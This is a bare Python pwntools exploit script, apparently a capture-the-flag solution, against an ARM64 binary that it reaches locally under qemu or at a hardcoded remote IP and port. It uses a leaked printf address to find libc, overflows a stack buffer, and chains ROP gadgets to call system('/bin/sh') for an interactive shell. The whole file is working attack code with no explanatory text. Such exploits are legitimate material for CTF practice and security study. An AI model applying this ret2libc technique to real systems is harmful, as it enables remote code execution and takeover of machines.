#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./arm')

if args.REMOTE:
	p = remote('172.104.14.64', 54732)
	libc = ELF('./libc-2.23.so')
	p.recvuntil('printf at ')
else:
	if os.uname().machine == context.arch:
		p = process(binary.path)
		libc = binary.libc
	else:
		if args.GDB:
			p = process(('stdbuf -i0 -o0 -e0 qemu-'+context.arch+' -g 9000 -L /usr/'+context.arch+'-linux-gnu '+binary.path).split())
		else:
			p = process(('stdbuf -i0 -o0 -e0 qemu-'+context.arch+' -L /usr/'+context.arch+'-linux-gnu '+binary.path).split())
		libc = ELF('/usr/'+context.arch+'-linux-gnu/lib/libc.so.6')
	p.recvuntil('print at ')

_ = p.recvline().strip().decode()
printf = int(_,16)
libc.address = printf - libc.sym.printf
log.info('libc.address: ' + hex(libc.address))

payload  = b''
payload += 128 * b'A'
payload += 8 * b'B'
payload += p64(libc.search(asm('ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__())
payload += (8 * 3) * b'C'
payload += p64(libc.search(asm('mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__())
payload += p64(libc.search(b"/bin/sh").__next__())
payload += (8 * 2) * b'D'
payload += p64(libc.sym.system)

p.sendlineafter('> ',payload)
for i in range(3): p.recvline()
p.interactive()
